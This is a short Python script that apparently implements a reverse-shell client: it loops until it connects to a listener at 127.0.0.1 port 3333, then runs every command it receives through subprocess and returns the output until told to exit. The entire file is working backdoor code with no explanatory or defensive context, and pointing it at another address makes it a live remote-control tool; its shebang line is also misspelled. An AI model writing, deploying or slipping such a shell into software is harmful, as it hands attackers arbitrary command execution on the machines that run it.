#!/use/bin/python3
import subprocess
from socket import *

def client():
    c=socket(AF_INET,SOCK_STREAM)
    while True:
        try:
           c.connect(("127.0.0.1",3333))
           break
        except ConnectionRefusedError:
           pass

    while True:
        cmd = (c.recv(1024)).decode()
        output = subprocess.getoutput(cmd)
        if cmd == "exit":
            break
        c.send(output.encode())


client()
